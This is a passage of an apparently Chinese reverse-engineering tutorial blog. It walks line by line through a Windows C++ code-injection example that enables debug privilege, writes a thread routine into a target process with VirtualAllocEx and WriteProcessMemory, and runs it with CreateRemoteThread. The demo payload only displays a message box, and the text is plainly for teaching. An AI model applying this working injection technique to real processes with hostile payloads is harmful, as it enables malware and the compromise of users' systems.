class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CodeInjection.cpp</span></span><br><span class="line"><span class="comment">// reversecore@gmail.com</span></span><br><span class="line"><span class="comment">// http://www.reversecore.com</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">THREAD_PARAM</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    FARPROC pFunc[<span class="number">2</span>];               <span class="comment">// LoadLibraryA(), GetProcAddress()</span></span><br><span class="line">    <span class="type">char</span>    szBuf[<span class="number">4</span>][<span class="number">128</span>];          <span class="comment">// &quot;user32.dll&quot;, &quot;MessageBoxA&quot;, &quot;www.reversecore.com&quot;, &quot;ReverseCore&quot;</span></span><br><span class="line">&#125; THREAD_PARAM, *PTHREAD_PARAM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">HMODULE</span> <span class="params">(WINAPI *PFLOADLIBRARYA)</span></span><br><span class="line"><span class="params">(</span></span><br><span class="line"><span class="params">    LPCSTR lpLibFileName</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">FARPROC</span> <span class="params">(WINAPI *PFGETPROCADDRESS)</span></span><br><span class="line"><span class="params">(</span></span><br><span class="line"><span class="params">    HMODULE hModule,</span></span><br><span class="line"><span class="params">    LPCSTR lpProcName</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(WINAPI *PFMESSAGEBOXA)</span></span><br><span class="line"><span class="params">(</span></span><br><span class="line"><span class="params">    HWND hWnd,</span></span><br><span class="line"><span class="params">    LPCSTR lpText,</span></span><br><span class="line"><span class="params">    LPCSTR lpCaption,</span></span><br><span class="line"><span class="params">    UINT uType</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc</span><span class="params">(LPVOID lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">    PTHREAD_PARAM   pParam      = (PTHREAD_PARAM)lParam;</span><br><span class="line">    HMODULE         hMod        = <span class="literal">NULL</span>;</span><br><span class="line">    FARPROC         pFunc       = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// LoadLibrary()</span></span><br><span class="line">    hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[<span class="number">0</span>])(pParam-&gt;szBuf[<span class="number">0</span>]);    <span class="comment">// &quot;user32.dll&quot;</span></span><br><span class="line">    <span class="keyword">if</span>( !hMod )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// GetProcAddress()</span></span><br><span class="line">    pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[<span class="number">1</span>])(hMod, pParam-&gt;szBuf[<span class="number">1</span>]);  <span class="comment">// &quot;MessageBoxA&quot;</span></span><br><span class="line">    <span class="keyword">if</span>( !pFunc )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// MessageBoxA()</span></span><br><span class="line">    ((PFMESSAGEBOXA)pFunc)(<span class="literal">NULL</span>, pParam-&gt;szBuf[<span class="number">2</span>], pParam-&gt;szBuf[<span class="number">3</span>], MB_OK);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">InjectCode</span><span class="params">(DWORD dwPID)</span></span><br><span class="line">&#123;</span><br><span class="line">    HMODULE         hMod            = <span class="literal">NULL</span>;</span><br><span class="line">    THREAD_PARAM    param           = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    HANDLE          hProcess        = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE          hThread         = <span class="literal">NULL</span>;</span><br><span class="line">    LPVOID          pRemoteBuf[<span class="number">2</span>]   = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    DWORD           dwSize          = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    hMod = GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set THREAD_PARAM</span></span><br><span class="line">    param.pFunc[<span class="number">0</span>] = GetProcAddress(hMod, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    param.pFunc[<span class="number">1</span>] = GetProcAddress(hMod, <span class="string">&quot;GetProcAddress&quot;</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">0</span>], <span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">1</span>], <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">2</span>], <span class="string">&quot;www.reversecore.com&quot;</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">3</span>], <span class="string">&quot;ReverseCore&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open Process</span></span><br><span class="line">    <span class="keyword">if</span> ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS,   <span class="comment">// dwDesiredAccess</span></span><br><span class="line">                                  FALSE,                <span class="comment">// bInheritHandle</span></span><br><span class="line">                                  dwPID)) )             <span class="comment">// dwProcessId</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OpenProcess() fail : err_code = %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocation for THREAD_PARAM</span></span><br><span class="line">    dwSize = <span class="keyword">sizeof</span>(THREAD_PARAM);</span><br><span class="line">    <span class="keyword">if</span>( !(pRemoteBuf[<span class="number">0</span>] = VirtualAllocEx(hProcess,          <span class="comment">// hProcess</span></span><br><span class="line">                                      <span class="literal">NULL</span>,                 <span class="comment">// lpAddress</span></span><br><span class="line">                                      dwSize,               <span class="comment">// dwSize</span></span><br><span class="line">                                      MEM_COMMIT,           <span class="comment">// flAllocationType</span></span><br><span class="line">                                      PAGE_READWRITE)) )    <span class="comment">// flProtect</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx() fail : err_code = %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !WriteProcessMemory(hProcess,                       <span class="comment">// hProcess</span></span><br><span class="line">                            pRemoteBuf[<span class="number">0</span>],                  <span class="comment">// lpBaseAddress</span></span><br><span class="line">                            (LPVOID)&amp;param,                 <span class="comment">// lpBuffer</span></span><br><span class="line">                            dwSize,                         <span class="comment">// nSize</span></span><br><span class="line">                            <span class="literal">NULL</span>) )                         <span class="comment">// [out] lpNumberOfBytesWritten</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory() fail : err_code = %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocation for ThreadProc()</span></span><br><span class="line">    dwSize = (DWORD)InjectCode - (DWORD)ThreadProc;</span><br><span class="line">    <span class="keyword">if</span>( !(pRemoteBuf[<span class="number">1</span>] = VirtualAllocEx(hProcess,          <span class="comment">// hProcess</span></span><br><span class="line">                                      <span class="literal">NULL</span>,                 <span class="comment">// lpAddress</span></span><br><span class="line">                                      dwSize,               <span class="comment">// dwSize</span></span><br><span class="line">                                      MEM_COMMIT,           <span class="comment">// flAllocationType</span></span><br><span class="line">                                      PAGE_EXECUTE_READWRITE)) )    <span class="comment">// flProtect</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx() fail : err_code = %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !WriteProcessMemory(hProcess,                       <span class="comment">// hProcess</span></span><br><span class="line">                            pRemoteBuf[<span class="number">1</span>],                  <span class="comment">// lpBaseAddress</span></span><br><span class="line">                            (LPVOID)ThreadProc,             <span class="comment">// lpBuffer</span></span><br><span class="line">                            dwSize,                         <span class="comment">// nSize</span></span><br><span class="line">                            <span class="literal">NULL</span>) )                         <span class="comment">// [out] lpNumberOfBytesWritten</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory() fail : err_code = %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !(hThread = CreateRemoteThread(hProcess,            <span class="comment">// hProcess</span></span><br><span class="line">                                       <span class="literal">NULL</span>,                <span class="comment">// lpThreadAttributes</span></span><br><span class="line">                                       <span class="number">0</span>,                   <span class="comment">// dwStackSize</span></span><br><span class="line">                                       (LPTHREAD_START_ROUTINE)pRemoteBuf[<span class="number">1</span>],     <span class="comment">// dwStackSize</span></span><br><span class="line">                                       pRemoteBuf[<span class="number">0</span>],       <span class="comment">// lpParameter</span></span><br><span class="line">                                       <span class="number">0</span>,                   <span class="comment">// dwCreationFlags</span></span><br><span class="line">                                       <span class="literal">NULL</span>)) )             <span class="comment">// lpThreadId</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateRemoteThread() fail : err_code = %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">SetPrivilege</span><span class="params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span> </span><br><span class="line">&#123;</span><br><span class="line">    TOKEN_PRIVILEGES tp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID luid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !OpenProcessToken(GetCurrentProcess(),</span><br><span class="line">                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, </span><br><span class="line">              &amp;hToken) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OpenProcessToken error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !LookupPrivilegeValue(<span class="literal">NULL</span>,           <span class="comment">// lookup privilege on local system</span></span><br><span class="line">                              lpszPrivilege,  <span class="comment">// privilege to lookup </span></span><br><span class="line">                              &amp;luid) )        <span class="comment">// receives LUID of privilege</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;LookupPrivilegeValue error: %u\n&quot;</span>, GetLastError() ); </span><br><span class="line">        <span class="keyword">return</span> FALSE; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    <span class="keyword">if</span>( bEnablePrivilege )</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enable the privilege or disable all privileges.</span></span><br><span class="line">    <span class="keyword">if</span>( !AdjustTokenPrivileges(hToken, </span><br><span class="line">                               FALSE, </span><br><span class="line">                               &amp;tp, </span><br><span class="line">                               <span class="keyword">sizeof</span>(TOKEN_PRIVILEGES), </span><br><span class="line">                               (PTOKEN_PRIVILEGES) <span class="literal">NULL</span>, </span><br><span class="line">                               (PDWORD) <span class="literal">NULL</span>) )</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;AdjustTokenPrivileges error: %u\n&quot;</span>, GetLastError() ); </span><br><span class="line">        <span class="keyword">return</span> FALSE; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( GetLastError() == ERROR_NOT_ALL_ASSIGNED )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The token does not have the specified privilege. \n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD dwPID     = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( argc != <span class="number">2</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n USAGE  : %s &lt;pid&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// change privilege</span></span><br><span class="line"><span class="keyword">if</span>( !SetPrivilege(SE_DEBUG_NAME, TRUE) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// code injection</span></span><br><span class="line">    dwPID = (DWORD)atol(argv[<span class="number">1</span>]);</span><br><span class="line">    InjectCode(dwPID);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h5 id="main"><a href="#main" class="headerlink" title="main"></a>main</h5><p>首先是CodeInjection的main</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span>        <span class="comment">//注入器需要的参数，注入目标进程的pid</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD dwPID     = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( argc != <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n USAGE  : %s &lt;pid&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// change privilege</span></span><br><span class="line">    <span class="keyword">if</span>( !SetPrivilege(SE_DEBUG_NAME, TRUE) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// code injection</span></span><br><span class="line">    dwPID = (DWORD)atol(argv[<span class="number">1</span>]);   <span class="comment">//数字字符转化为long int类型</span></span><br><span class="line">    InjectCode(dwPID);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无非做了参数合法验证，由于涉及跨进程内存操作，因此需要提升权限SetPrivilege，进程权限提升在之前有做过文章描述。随后是转化传递进来的pid，转化为int类型，然后进入InjectCode函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HMODULE         hMod            = <span class="literal">NULL</span>;</span><br><span class="line">THREAD_PARAM    param           = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">HANDLE          hProcess        = <span class="literal">NULL</span>;</span><br><span class="line">HANDLE          hThread         = <span class="literal">NULL</span>;</span><br><span class="line">LPVOID          pRemoteBuf[<span class="number">2</span>]   = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">DWORD           dwSize          = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//上述几行代码在CodeInject.cpp中相关的内容</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">HMODULE</span> <span class="params">(WINAPI *PFLOADLIBRARYA)</span></span><br><span class="line"><span class="params">(</span></span><br><span class="line"><span class="params">    LPCSTR lpLibFileName</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">THREAD_PARAM</span> //传递给线程的参数</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    FARPROC pFunc[<span class="number">2</span>];               <span class="comment">// LoadLibraryA(), GetProcAddress()</span></span><br><span class="line">    <span class="type">char</span>    szBuf[<span class="number">4</span>][<span class="number">128</span>];          </span><br><span class="line">    <span class="comment">// &quot;user32.dll&quot;, &quot;MessageBoxA&quot;, &quot;www.reversecore.com&quot;, &quot;ReverseCore&quot;</span></span><br><span class="line">&#125; THREAD_PARAM, *PTHREAD_PARAM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">FARPROC</span> <span class="params">(WINAPI *PFGETPROCADDRESS)</span></span><br><span class="line"><span class="params">(</span></span><br><span class="line"><span class="params">    HMODULE hModule,</span></span><br><span class="line"><span class="params">    LPCSTR lpProcName</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(WINAPI *PFMESSAGEBOXA)</span><span class="comment">//根据API原型定义的</span></span><br><span class="line"><span class="params">(</span></span><br><span class="line"><span class="params">    HWND hWnd,</span></span><br><span class="line"><span class="params">    LPCSTR lpText,</span></span><br><span class="line"><span class="params">    LPCSTR lpCaption,</span></span><br><span class="line"><span class="params">    UINT uType</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><h5 id="线程参数写入"><a href="#线程参数写入" class="headerlink" title="线程参数写入"></a>线程参数写入</h5><p>接着InjectCode函数的源码分析，下边完成的是线程参数的写入</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hMod = <span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line"><span class="comment">// set THREAD_PARAM</span></span><br><span class="line">    param.pFunc[<span class="number">0</span>] = <span class="built_in">GetProcAddress</span>(hMod, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    param.pFunc[<span class="number">1</span>] = <span class="built_in">GetProcAddress</span>(hMod, <span class="string">&quot;GetProcAddress&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy_s</span>(param.szBuf[<span class="number">0</span>], <span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy_s</span>(param.szBuf[<span class="number">1</span>], <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy_s</span>(param.szBuf[<span class="number">2</span>], <span class="string">&quot;www.reversecore.com&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy_s</span>(param.szBuf[<span class="number">3</span>], <span class="string">&quot;ReverseCore&quot;</span>);</span><br></pre></td></tr></table></figure><p>重点关注线程参数的设置：</p><ul><li>线程中需要用到的kernel32.LoadLibraryA &amp; kernel32.GetProcAddress</li><li>线程中需要用到的一些字符串，user32.dll，MessageBoxA，www.reversecore.com，ReverseCore。</li></ul><p>根据线程参数也猜得出大致线程的行为，获取<code>kernel32.LoadLibraryA </code>后将user32.dll载入，<code>kernel32.GetProcAddress</code>获取<code>user32.MessageBoxA</code> API地址，完成MessageBoxA调用，实现弹窗</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) ) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;OpenProcess() fail : err_code = %d\n&quot;</span>, GetLastError());</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以PROCESS_ALL_ACCESS打开目标进程，打开成功后返回目标进程的句柄到hProcess</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dwSize = <span class="keyword">sizeof</span>(THREAD_PARAM);</span><br></pre></td></tr></table></figure><p>计算将要传递进目标进程中作为线程参数的结构体大小，计算结果存放在dwSize中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( !(pRemoteBuf[<span class="number">0</span>] = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwSize,</span><br><span class="line">             MEM_COMMIT, PAGE_READWRITE)) ) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx() fail : err_code = %d\n&quot;</span>, GetLastError());</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在目标进程hProcess开辟一段大小为dwSize的内存空间，对于这块内存的详情为MEM_COMMIT，保护形式为PAGE_READWRITE，也就是具备读写权限。</p><p>关于MEM_COMMIT的描述：</p><blockquote><p>为指定地址空间提交物理内存。这个函数初始化内在为零，试图提交已提交的内存页不会导致函数失败。这<strong>意味着您可以在不确定当前页的当前提交状态的情况下提交一系列页面</strong>。如果尚未保留内存页，则设置此值会导致函数同时保留并提交内存页。</p></blockquote><p>函数执行成功后在目标进程中开辟的内存空间起始地址放入<code>pRemoteBuf[0]</code></p><p>往下分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( !WriteProcessMemory(hProcess, pRemoteBuf[<span class="number">0</span>], (LPVOID)&amp;param, dwSize, <span class="literal">NULL</span>) ) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory() fail : err_code = %d\n&quot;</span>, GetLastError());</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>往先前在目标进程中开辟出来的内存空间写入线程参数<code>param</code>。</p><p><strong>至此完成线程参数写入目标进程空间</strong></p><h5 id="线程代码写入"><a href="#线程代码写入" class="headerlink" title="线程代码写入"></a>线程代码写入</h5><p>接下来需要写入线程的代码，同样使用VirtualAllocEx API</p><h6 id="需要注意的点"><a href="#需要注意的点" class="headerlink" title="需要注意的点"></a>需要注意的点</h6><blockquote><p>在目标进程中分配线程代码所需要的空间需要进行计算得出。</p><p>源码中计算方式，<code>dwSize = (DWORD)InjectCode - (DWORD)ThreadProc;  </code></p><p>之所以能够这样计算是由于作者使用的MS Visual C++中使用Release模式编译程序源码，源码中函数顺序和二进制代码中的前后顺序是一致的，源码文件是按照ThreadProc、InjectCode顺序编写的，所以生成InjectCode.exe中两函数也按照这个顺序排列。（特性，记住，会用就好）</p></blockquote><p>因此我们得到了需要在目标进程中开辟另外一块空间，写入线程的代码，在目标进程中使用<code>CreateRemoteThread</code>设置回调函数为即将写入的<code>ThreadProc</code>,在传入<code>ThreadProc</code>需要的参数<code>param</code>，如此一来，当在目标进程中开辟成功线程，新线程会自行调用<code>ThreadProc</code></p><p>言归正传，得到线程代码所需要的空间大小<code>dwSize </code>，接下来就是申请空间了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( !(pRemoteBuf[<span class="number">1</span>] = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwSize, </span><br><span class="line">                                     MEM_COMMIT, PAGE_EXECUTE_READWRITE)) ) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx() fail : err_code = %d\n&quot;</span>, GetLastError());</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方式类似于第一次调用<code>VirtualAllocEx</code>进行线程所需参数空间一样，区别在于开辟出来的空间的权限，这块空间是需要执行权限的，因为这是代码的位置。开辟出来的空间起始地址放在<code>pRemoteBuf[1]</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( !WriteProcessMemory(hProcess, pRemoteBuf[<span class="number">1</span>], </span><br><span class="line">                        (LPVOID)ThreadProc, dwSize, <span class="literal">NULL</span>) ) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory() fail : err_code = %d\n&quot;</span>, GetLastError());</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要理解一下，<code>ThreadProc</code> + <code>dwSize</code> 这两个内容配合，完成<code>ThreadProc</code>代码的完整写入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( !(hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pRemoteBuf[<span class="number">1</span>], pRemoteBuf[<span class="number">0</span>], <span class="number">0</span>,   <span class="literal">NULL</span>)) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CreateRemoteThread() fail : err_code = %d\n&quot;</span>, GetLastError());</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一切准备就绪，在目标进程中开启新线程，线程中执行写入的<code>ThreadProc</code>代码。</p><h5 id="ThreadProc"><a href="#ThreadProc" class="headerlink" title="ThreadProc"></a>ThreadProc</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">DWORD WINAPI 